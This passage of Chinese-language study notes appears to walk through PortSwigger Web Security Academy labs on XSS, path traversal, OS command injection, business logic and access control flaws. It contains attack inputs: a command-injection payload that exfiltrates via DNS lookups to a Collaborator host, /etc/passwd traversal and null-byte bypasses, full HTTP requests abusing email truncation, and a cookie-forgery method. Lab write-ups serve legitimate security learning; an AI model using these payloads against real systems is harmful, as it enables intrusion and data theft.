'unsafe-inline'</code>。这个指令使用了CSP中的script-src-elem指令，它允许控制页面中的script元素，包括内联脚本。通过这个指令，恶意用户成功覆盖了现有的script-src规则，并将其设置为允许内联脚本的加载<imgsrc="https://s2.loli.net/2023/06/07/WxhHydkewDsTZMG.png"alt="image-20230607175620124" /></p></li></ol><h5 id="dangling-markup-injection-1">Dangling markup injection</h5><p>悬空标记注入（Dangling MarkupInjection）是一种在无法进行完整的跨站脚本（XSS）攻击的情况下，利用输入过滤或其他防御措施的漏洞来跨域捕获数据的技术。它通常被利用来获取对其他用户可见的敏感信息，包括可以用于代表用户执行未经授权操作的CSRF令牌。</p><p>当应用程序以不安全的方式将可控数据嵌入其响应中时，悬空标记注入就可能发生。攻击者可以利用未过滤或转义"&gt;"或"""字符的情况下，通过注入特定的语法，从引号包围的属性值和封闭标签中跳出，返回到HTML上下文。</p><p>悬空标记注入攻击通常使用一些特定的标签或属性，例如img标签的src属性。攻击者可以创建一个img标签，定义src属性的开始，并在其中插入指向自己服务器的URL。重要的是，攻击载荷不会关闭src属性，使其“悬空”。当浏览器解析响应时，它会一直向前查找，直到遇到一个单引号来终止属性。在此之前的所有内容都将被视为URL的一部分，并在URL查询字符串中发送到攻击者的服务器。任何进行外部请求的属性都可以用于悬空标记注入。</p><p>悬空标记注入的后果是攻击者可以捕获注入点后面部分的应用程序响应，其中可能包含敏感数据。根据应用程序的功能，这可能包括CSRF令牌、电子邮件消息或财务数据等。</p><p>因此，为了防止悬空标记注入攻击，应采取适当的输入过滤和输出编码措施，并使用安全的开发实践来确保应用程序正确处理和验证用户输入。</p><h4 id="how-to-prevent-xss-attacks">How to prevent XSS attacks</h4><ul><li><p>防止跨站脚本攻击（XSS）在某些情况下很容易，但根据应用程序的复杂性和处理用户可控数据的方式，可能会更加困难。</p><p>一般来说，有效地防止XSS漏洞可能需要采取以下措施的组合：</p><ol type="1"><li>在数据输入时进行过滤：在接收用户输入的地方，根据预期或有效输入进行严格的过滤处理。</li><li>在数据输出时进行编码：在将用户可控数据输出到HTTP响应中时，对输出进行编码，以防止其被解释为活动内容。根据输出的上下文，可能需要应用HTML、URL、JavaScript和CSS编码的组合。</li><li>使用适当的响应头：为了防止非HTML或JavaScript内容的HTTP响应中发生XSS，可以使用Content-Type和X-Content-Type-Options头来确保浏览器按照您的意图解释响应。</li><li>内容安全策略（Content SecurityPolicy）：作为最后的防线，您可以使用内容安全策略（CSP）来减轻任何仍然存在的XSS漏洞的严重程度。</li></ol></li><li><p>白名单与黑名单在输入验证中，通常应使用白名单而不是黑名单。例如，与其试图列出所有有害的协议（例如javascript、data等），只需列出安全的协议（如HTTP、HTTPS），并禁止列表之外的任何协议。这样做可以确保您的防御不会在新的有害协议出现时被破坏，并且能够更少地受到那些试图混淆无效值以逃避黑名单的攻击的影响。</p></li></ul><h4 id="common-questions-about-cross-site-scripting">Common questionsabout cross-site scripting</h4><ul><li><strong>What is the difference between XSS and CSRF?</strong> XSSinvolves causing a web site to return malicious JavaScript, while CSRFinvolves inducing a victim user to perform actions they do not intend todo.</li></ul><h3 id="directory-traversal">Directory traversal</h3><h5 id="lab-file-path-traversal-simple-case">Lab: File path traversal,simple case</h5><ol type="1"><li>请求一张图片<imgsrc="https://s2.loli.net/2023/08/09/mafC76K4cnVYAJZ.png"alt="image-20230809002452209" /></li><li>修改参数值<imgsrc="https://s2.loli.net/2023/08/09/fqzvpN97HxJQe8g.png"alt="image-20230809002525622" /></li></ol><h5id="lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">Lab:File path traversal, traversal sequences blocked with absolute pathbypass</h5><ol type="1"><li>使用从文件系统根目录开始的绝对路径，比如<code>filename=/etc/passwd</code>，来直接引用文件，而无需使用任何遍历序列。这样的绕过方式可能是因为应用程序可能只关注遍历序列，而忽略了绝对路径的潜在威胁。<imgsrc="https://s2.loli.net/2023/08/09/ewU1RjhbOsxTYPl.png"alt="image-20230809003207520" /></li></ol><h5id="lab-file-path-traversal-traversal-sequences-stripped-non-recursively">Lab:File path traversal, traversal sequences stripped non-recursively</h5><ol type="1"><li>双重是因为检测只有一重？<imgsrc="https://s2.loli.net/2023/08/09/EoFmAZNyM4Kx9Lc.png"alt="image-20230809003555999" /></li></ol><h5id="lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode">Lab:File path traversal, traversal sequences stripped with superfluousURL-decode</h5><ol type="1"><li>编码绕过<imgsrc="https://s2.loli.net/2023/08/09/3GEXMUuBFpjNn8b.png"alt="image-20230809005237898" /></li></ol><h5 id="lab-file-path-traversal-validation-of-start-of-path">Lab: Filepath traversal, validation of start of path</h5><ol type="1"><li>基本目录<imgsrc="https://s2.loli.net/2023/08/09/CFE8sRAdoZqaL9u.png"alt="image-20230809005226467" /></li></ol><h5id="lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass">Lab:File path traversal, validation of file extension with null bytebypass</h5><ol type="1"><li><code>%00</code>是空字节的URL编码形式。当应用程序试图检查文件名的扩展名时，空字节会终止字符串的比较，从而使应用程序认为文件名是以期望的扩展名结尾的<imgsrc="https://s2.loli.net/2023/08/09/4mrab2F9zPctONE.png"alt="image-20230809005900021" /></li></ol><h3 id="os-command-injection">OS command injection</h3><h4 id="executing-arbitrary-commands">Executing arbitrary commands</h4><h5 id="lab-os-command-injection-simple-case">Lab: OS command injection,simple case</h5><ol type="1"><li>simple case<imgsrc="https://s2.loli.net/2023/08/09/QHCtLKul9WZFnh6.png"alt="image-20230809065256169" /></li></ol><h4 id="blind-os-command-injection-vulnerabilities">Blind OS commandinjection vulnerabilities</h4><h5 id="lab-blind-os-command-injection-with-time-delays">Lab: Blind OScommand injection with time delays</h5><ol type="1"><li>发送10个<code>ping</code>包，响应耗时10s现象<imgsrc="https://s2.loli.net/2023/08/09/scxPvrb4C5eXwIV.png"alt="image-20230809070142771" /></li></ol><h5 id="lab-blind-os-command-injection-with-output-redirection">Lab:Blind OS command injection with output redirection</h5><ol type="1"><li>修改email参数值<imgsrc="https://s2.loli.net/2023/08/09/Jys1lGr7SNU8nCR.png"alt="image-20230809071210946" /></li><li>请求文件<imgsrc="https://s2.loli.net/2023/08/09/2XDWxwnAlcMI1rT.png"alt="image-20230809071228715" /></li></ol><h5id="lab-blind-os-command-injection-with-out-of-band-interaction">Lab:Blind OS command injection with out-of-band interaction</h5><ol type="1"><li><p>payload</p><pre class="language-none"><code class="language-none">email&#x3D;x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||</code></pre><p>在这个命令注入+DNS数据泄露的payload中,<code>x.BURP-COLLABORATOR-SUBDOMAIN</code>这个参数有以下作用:</p><ol type="1"><li><p>x 是随意的主机名,没有实际作用,仅用于占位。</p></li><li><p>BURP-COLLABORATOR-SUBDOMAIN 是BurpSuite的Collaborator服务器的子域名。</p></li><li><p>Collaborator服务器可以将发往其子域名的任何请求转发给攻击者。</p></li><li><p>因此,被注入的nslookup命令会向这个 subdomain发起DNS查询请求。</p></li><li><p>该请求会被转发给攻击者的BurpSuite,以此实现命令输出的out-of-band泄露。</p></li><li><p>攻击者可以在Burp的DNS历史中获取查询结果,并分析命令执行返回的数据。</p></li></ol><figure><img src="https://s2.loli.net/2023/08/09/7tiwTWK1vXEDFdZ.png"alt="image-20230809105417745" /><figcaption aria-hidden="true">image-20230809105417745</figcaption></figure></li></ol><h5id="lab-blind-os-command-injection-with-out-of-band-data-exfiltration">Lab:Blind OS command injection with out-of-band data exfiltration</h5><ol type="1"><li>第三方服务器<imgsrc="https://s2.loli.net/2023/08/09/8QirVvapoL6WKAc.png"alt="image-20230809111705443" /></li><li>查看服务器接收到的请求<imgsrc="https://s2.loli.net/2023/08/09/JUv7z9LojmFyQRs.png"alt="image-20230809111722457" /></li></ol><h5 id="ways-of-injecting-os-commands">Ways of injecting OScommands</h5><ol type="1"><li><p>操作系统命令注入可以通过多种特殊字符来实现,主要包括:</p><p>命令分隔符,可以连接多个命令:</p><ul><li>&amp;</li><li>&amp;&amp;</li><li><div class="line-block"></div></li><li>||</li></ul><p>仅Unix系统支持的分隔符:</p><ul><li>;</li><li>换行符(0x0a 或 )</li></ul><p>Unix系统也支持:</p><ul><li>反引号,实现内联命令执行</li><li>$(命令),执行嵌套的命令</li></ul><p>不同分隔符的行为稍有不同,可能影响命令执行和输出获取。</p><p>如果控制的输入在引号中,需要先终止引号后再注入。</p></li></ol><h3 id="business-logic-vulnerabilities">Business logicvulnerabilities</h3><h4 id="what-are-business-logic-vulnerabilities">What are business logicvulnerabilities?</h4><ol type="1"><li><strong>业务逻辑漏洞</strong>是应用程序设计和实现中的缺陷，允许攻击者引发意外行为。这可能使攻击者能够操纵合法功能来实现恶意目标。这些缺陷通常是由于未能预见可能发生的异常应用程序状态而导致的，因此未能安全地处理它们。</li></ol><h4 id="how-do-business-logic-vulnerabilities-arise">How do businesslogic vulnerabilities arise?</h4><ol type="1"><li>业务逻辑漏洞通常是因为设计和开发团队对用户如何与应用程序交互产生了<strong>错误的假设</strong>而产生的。这些错误的假设可能导致对<strong>用户输入的验证</strong>不足，从而创建了攻击者可以利用的安全漏洞。</li></ol><h4 id="lab-excessive-trust-in-client-side-controls">Lab: Excessivetrust in client-side controls</h4><ol type="1"><li>购物车请求：修改价格<imgsrc="https://s2.loli.net/2023/08/09/rgpEAwZ5WoeIFml.png"alt="image-20230809222303055" /></li></ol><h4 id="lab-high-level-logic-vulnerability">Lab: High-level logicvulnerability</h4><ol type="1"><li>必须包括这件商品：<strong>Lightweight "l33t" LeatherJacket</strong></li><li>quatatity修改为负数,使得<strong>总金额小于自己的余额</strong><imgsrc="https://s2.loli.net/2023/08/09/ZxLBAW3XRGDyQ4s.png"alt="image-20230809231305578" /><imgsrc="https://s2.loli.net/2023/08/09/tHYNx14Jb3ofQdE.png"alt="image-20230809231437035" /></li></ol><h4 id="lab-low-level-logic-flaw">Lab: Low-level logic flaw</h4><ol type="1"><li><p>依然是针对商品 <strong>Lightweight "l33t" LeatherJacket</strong></p></li><li><p>payload设置，不需要<code>$$</code>标记<imgsrc="https://s2.loli.net/2023/08/10/WT8wxdhviaDAeSZ.png"alt="image-20230810001758888" /></p></li><li><p>刷新页面，发现总金额在最大值正数和最小负数之间循环<imgsrc="https://s2.loli.net/2023/08/10/ZqJIYUd2WBwGegF.png"alt="image-20230810001915266" /></p></li><li><p>设置为单线程<imgsrc="https://s2.loli.net/2023/08/10/i27krtQVe4lsaCg.png"alt="image-20230810002140658" /></p></li><li><p>凑数到低于100美元（你的余额）的正数<imgsrc="https://s2.loli.net/2023/08/10/MXpeqEk6lHW9QCR.png"alt="image-20230810002223489" /></p></li></ol><h4 id="lab-inconsistent-handling-of-exceptional-input">Lab:Inconsistent handling of exceptional input</h4><ol type="1"><li><p>burpsuite 中的目录扫描</p><ol type="1"><li><figure><img src="https://s2.loli.net/2023/08/10/UjiQRFE7Lv25hDs.png"alt="image-20230810010138152" /><figcaption aria-hidden="true">image-20230810010138152</figcaption></figure></li><li><p>点击<img src="https://s2.loli.net/2023/08/10/hWVzdKSsGBYvcNp.png"alt="image-20230810010254133" /></p></li><li><p>sitemap tab,发现admin子目录<imgsrc="https://s2.loli.net/2023/08/10/ACsQ9kEaz5WIJjv.png"alt="image-20230810010327258" /></p></li><li><p>访问/admin，发现<strong>DontWanaCry</strong></p></li></ol></li><li><p>注册账号</p><ol type="1"><li><p>使用一个超长邮箱注册</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>register</span></span> <span class="token http-version property">HTTP/2</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">0a2b00240301573a8226b6c600a20042.web-security-academy.net</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=gJQODMRLEvXwfCUZJzL1HXvUiRkcRAwY</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2260</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span><span class="token header"><span class="token header-name keyword">Sec-Ch-Ua</span><span class="token punctuation">:</span> <span class="token header-value">"Not A(Brand";v="24", "Chromium";v="110"</span></span><span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span><span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Platform</span><span class="token punctuation">:</span> <span class="token header-value">"Windows"</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://0a2b00240301573a8226b6c600a20042.web-security-academy.net</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://0a2b00240301573a8226b6c600a20042.web-security-academy.net/register</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span>csrf=pZRphKSTs2NSro9T0Liyh5lrW0OgB7jX&amp;username=test&amp;email=attackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattacker@exploit-0afa0022035d57868203b55501cd003f.exploit-server.net&amp;password=test</code></pre></li><li><p>发现邮箱被截断为255字符<imgsrc="https://s2.loli.net/2023/08/10/EnTObQSHhP6muzM.png"alt="image-20230810010924104" /></p></li></ol></li><li><p>再次注册一个账号，满足如下要求：</p><ol type="1"><li><p>邮箱选中部分刚好255字符<imgsrc="https://s2.loli.net/2023/08/10/zRoiuTYQOIw3rPF.png"alt="image-20230810011020676" /></p></li><li><p>完整请求如下：</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>register</span></span> <span class="token http-version property">HTTP/2</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">0a2b00240301573a8226b6c600a20042.web-security-academy.net</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=ArEtfsoGAqqc5jmG5URSVYZiCfmx90PY</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">391</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span><span class="token header"><span class="token header-name keyword">Sec-Ch-Ua</span><span class="token punctuation">:</span> <span class="token header-value">"Not A(Brand";v="24", "Chromium";v="110"</span></span><span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span><span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Platform</span><span class="token punctuation">:</span> <span class="token header-value">"Windows"</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://0a2b00240301573a8226b6c600a20042.web-security-academy.net</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://0a2b00240301573a8226b6c600a20042.web-security-academy.net/register</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span>csrf=HuvM2eC73r5n1JJs0UnonyMNOYH5smtd&amp;username=test2&amp;email=attackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattack%40dontwannacry.com.exploit-0afa0022035d57868203b55501cd003f.exploit-server.net&amp;password=test2</code></pre></li></ol></li><li><p>登录test2账号</p></li><li><p>删除carlos<imgsrc="https://s2.loli.net/2023/08/10/SdqRmDwE7ZcTHNB.png"alt="image-20230810011136259" /></p></li></ol><h4 id="lab-inconsistent-security-controls">Lab: Inconsistent securitycontrols</h4><ol type="1"><li>发现/admin目录，<code>dontwannacry</code><imgsrc="https://s2.loli.net/2023/08/10/DUs8IaoPkWFO2lz.png"alt="image-20230810012700138" /></li><li>注册后，可以更改邮箱<imgsrc="https://s2.loli.net/2023/08/10/SwXtgNEIL4KMnDA.png"alt="image-20230810012625538" /></li><li>删除carlos<imgsrc="https://s2.loli.net/2023/08/10/SdqRmDwE7ZcTHNB.png"alt="image-20230810012712771" /></li></ol><h4 id="lab-2fa-simple-bypass-1">Lab: 2FA simple bypass</h4><ol type="1"><li>使用wiener 双重验证后登录，观察登录后页面的url特点</li><li>使用carlos登录<imgsrc="https://s2.loli.net/2023/08/10/6cFzwXSt7UOLsDp.png"alt="image-20230810020335622" /></li><li>login2换成 <imgsrc="https://s2.loli.net/2023/08/10/UDvRQofX819MLZt.png"alt="image-20230810020449732" /></li></ol><h4 id="lab-insufficient-workflow-validation">Lab: Insufficient workflowvalidation</h4><ol type="1"><li>test<ol type="1"><li>将一件小额商品加入购物车，付款：注意会有一下几个页面相继出现<ol type="1"><li>购物车核对<imgsrc="https://s2.loli.net/2023/08/10/jt3WrId8AqKiYoh.png"alt="image-20230810023022616" /></li><li>订单验证<imgsrc="https://s2.loli.net/2023/08/10/nmSxoOqAuhQvZFR.png"alt="image-20230810023053586" /></li></ol></li></ol></li><li>将jacket 加入购物车，直接再次发送此请求，发现<imgsrc="https://s2.loli.net/2023/08/10/VsqTeC8jYFv1t3h.png"alt="image-20230810023152101" /></li></ol><h4 id="lab-authentication-bypass-via-flawed-state-machine">Lab:Authentication bypass via flawed state machine</h4><ol type="1"><li>目录扫描出<code>/admin</code></li><li>test<ol type="1"><li>登录wiener</li><li>有角色选择<imgsrc="https://s2.loli.net/2023/08/10/Bt9OwJNZWcXYiLh.png"alt="image-20230810024754578" /></li></ol></li><li>burp拦截，到role-selector时，丢弃该请求，并直接请求<code>/my-account</code><imgsrc="https://s2.loli.net/2023/08/10/3xf1eHVEPOXqgcQ.png"alt="image-20230810024907113" /></li></ol><h4 id="lab-weak-isolation-on-dual-use-endpoint">Lab: Weak isolation ondual-use endpoint</h4><ol type="1"><li>登录账号，修改密码，删除当前密码参数，能后修改成功<imgsrc="https://s2.loli.net/2023/08/10/Be7rPa6yksYpbFu.png"alt="image-20230810014757921" /></li><li>使用修改后的密码再次登录<ol type="1"><li>用户名换成：<code>administrator</code>，重复删操作</li></ol></li><li>登录administrator</li><li>删除carlos</li></ol><h4 id="lab-flawed-enforcement-of-business-rules">Lab: Flawedenforcement of business rules</h4><ol type="1"><li><strong>交替</strong>重复使用优惠券<imgsrc="https://s2.loli.net/2023/08/10/tRNT3WaqECZUp6x.png"alt="image-20230810031446789" /></li></ol><h4 id="lab-infinite-money-logic-flaw">Lab: Infinite money logicflaw</h4><ol type="1"><li>重复购买礼品卡</li><li>burp自动化完成</li><li>Project-session<imgsrc="https://s2.loli.net/2023/08/10/ervQoHWZ46RkGwN.png"alt="image-20230810074621206" /></li><li>scope <img src="https://s2.loli.net/2023/08/10/KcVz5tjTmdwyECB.png"alt="image-20230810074645046" /></li><li>detail<img src="https://s2.loli.net/2023/08/10/Nnskcued8GhRBJl.png"alt="image-20230810074719047" /></li><li>选中这5个请求<imgsrc="https://s2.loli.net/2023/08/10/gBkW6ESepChGL2R.png"alt="image-20230810074806757" /></li><li>处理请求4：config item<imgsrc="https://s2.loli.net/2023/08/10/ItTObzRsH5GNfyD.png"alt="image-20230810074838963" /></li><li>处理请求5<imgsrc="https://s2.loli.net/2023/08/10/WUEYzQAPv6bDrfN.png"alt="image-20230810074910969" /></li><li>test macro:对比请求4和5的兑换码是否一致<imgsrc="https://s2.loli.net/2023/08/10/MuUXlGK7H4SzOmn.png"alt="image-20230810074958224" /></li><li>一致则，持续点击ok到burp主页面，<ol type="1"><li>在intruder处理该请求<imgsrc="https://s2.loli.net/2023/08/10/Y2XtyF6MZHGbJiv.png"alt="image-20230810075107459" /></li><li>请求数<img src="https://s2.loli.net/2023/08/10/XHYVLZvkWlac3ox.png"alt="image-20230810075136854" /></li><li>单线程<img src="https://s2.loli.net/2023/08/10/9SRXW47pNLZ5Yvj.png"alt="image-20230810075153164" /></li></ol></li><li>刷新页面，查看余额，完成intruder,购买jac</li></ol><h4 id="lab-authentication-bypass-via-encryption-oracle">Lab:Authentication bypass via encryption oracle</h4><ol type="1"><li><p>注意到email值引起的变化，注意<strong>不同</strong>的请求地址</p><ol type="1"><li><p><strong>评论</strong>请求：加密请求<imgsrc="https://s2.loli.net/2023/08/10/ymzEaZKFOtIN6d4.png"alt="image-20230810064353321" /></p></li><li><p>作为响应：解密请求<imgsrc="https://s2.loli.net/2023/08/10/zoMpRV75qTOexPm.png"alt="image-20230810064439779" /></p></li><li><p>对<code>stay-login-in</code> cookie解码<imgsrc="https://s2.loli.net/2023/08/10/HLGbBJ8tn3Csydp.png"alt="image-20230810064536378" /></p></li><li><p>发现了其中stay-login-in构成，</p></li><li><p>且能够发现email值加密后都会显示共同前缀：<code>Invalid email address:</code></p></li></ol></li><li><p>如果使用<code>administrator:your-timestamp</code>作为email值,加密后的数据一定是16的倍数，而Invalidemailaddress:一共23字节（后面有<strong>空格</strong>），（总字节数是16的倍数）-（不是16倍数的前缀）=非16的倍数，如果就这样传进去会报错：非16倍数类似错误</p></li><li><p>因此再加<strong>9字节</strong>+<strong>23字节前缀</strong>=16的倍数，因此<code>email</code>=xxxxxxxxxadministrator:your-timestamp</p><ol type="1"><li>将此加密后的数据发送到decoder,url解码，base64解码，并删除前32字节<imgsrc="https://s2.loli.net/2023/08/10/sBPZduDHnOYvSzT.png"alt="image-20230810065614096" /></li></ol></li><li><p>删除后，再base64加密，url加密，复制结果到<code>GET /</code>中的stay-login-in值中，删除session，发送请求，登录了administrator</p></li></ol><h3 id="information-disclosure-vulnerabilities">Information disclosurevulnerabilities</h3><h4 id="lab-information-disclosure-on-debug-page">Lab: Informationdisclosure on debug page</h4><ol type="1"><li><p>engagement tools<imgsrc="https://s2.loli.net/2023/08/11/UPEVw13JYRkZnhz.png"alt="image-20230811204951886" /></p></li><li><p>result<imgsrc="https://s2.loli.net/2023/08/11/NhiBq4fDtEUInZM.png"alt="image-20230811205023609" /></p></li><li><p>find<img src="https://s2.loli.net/2023/08/11/3NkoGLtSYU2BJfV.png"alt="image-20230811205049997" /></p></li></ol><h3 id="lab-source-code-disclosure-via-backup-files">Lab: Source codedisclosure via backup files</h3><ol type="1"><li>request <code>/robots.txt</code><imgsrc="https://s2.loli.net/2023/08/11/1n52KlditehMWb4.png"alt="image-20230811215236432" /></li><li>request <code>/backup</code><imgsrc="https://s2.loli.net/2023/08/11/1nxeX2Zvd8qtKJp.png"alt="image-20230811215314870" /></li><li>查看源码<imgsrc="https://s2.loli.net/2023/08/11/3BPcsuU8tmkVixJ.png"alt="image-20230811215330523" /></li></ol><h4 id="lab-authentication-bypass-via-information-disclosure">Lab:Authentication bypass via information disclosure</h4><ol type="1"><li><p>请求 <code>/admin</code> 要求本地用户/ip</p></li><li><p>TRACE /admin<imgsrc="https://s2.loli.net/2023/08/11/KDrOqib42GBVnWt.png"alt="image-20230811222201916" /></p></li><li><p>burp使用代理<imgsrc="https://s2.loli.net/2023/08/11/4r8YvXhgVdEjiPo.png"alt="image-20230811222310442" /></p></li></ol><h4 id="lab-information-disclosure-in-version-control-history">Lab:Information disclosure in version control history</h4><ol type="1"><li><p>request <code>/.git</code></p></li><li><p>下载 <code>/.git/</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-r</span> https://0aa50088038b7be685d71473008f00a7.web-security-academy.net/.git/</code></pre></li><li><p><code>gitub desktop</code>打开文件夹<imgsrc="https://s2.loli.net/2023/08/11/6hs3a5kdqXfURx7.png"alt="image-20230811231336180" /></p></li></ol><h3 id="access-control-vulnerabilities-and-privilege-escalation">Accesscontrol vulnerabilities and privilege escalation</h3><h4 id="what-is-access-control">What is access control?</h4><ol type="1"><li><p><strong>身份验证</strong>：可识别用户并确认他们的身份。<strong>会话管理</strong>：可识别同一用户正在发出哪些后续 HTTP 请求。<strong>访问控制</strong>：确定是否允许用户执行他们尝试执行的操作。</p></li><li><p><strong>Vertical access controls</strong></p><p><strong>Horizontal access controls</strong></p><p><strong>Context-dependent access controls</strong></p></li></ol><h4 id="lab-unprotected-admin-functionality">Lab: Unprotected adminfunctionality</h4><ol type="1"><li><code>GET /administrator-panel/</code> <imgsrc="https://s2.loli.net/2023/08/12/uePw2okjnLf7xQE.png"alt="image-20230812101540559" /></li></ol><h4 id="lab-unprotected-admin-functionality-with-unpredictable-url">Lab:Unprotected admin functionality with unpredictable URL</h4><ol type="1"><li>查看js源码<imgsrc="https://s2.loli.net/2023/08/12/mMVHdvB3gY7GsAJ.png" /></li></ol><h4 id="lab-user-role-controlled-by-request-parameter">Lab: User rolecontrolled by request parameter</h4><ol type="1"><li>全程使用burp拦截请求，修改每一个请求的：<strong>admin=false</strong><imgsrc="https://s2.loli.net/2023/08/12/QkyBDqg8nGIiz16.png"alt="image-20230812103950179" /></li></ol><h4 id="lab-user-role-can-be-modified-in-user-profile">Lab: User rolecan be modified in user profile</h4><ol type="1"><li>拦截请求，登录账号，修改邮箱<imgsrc="https://s2.loli.net/2023/08/12/PkVdugI672KQBDU.png"alt="image-20230812104604617" 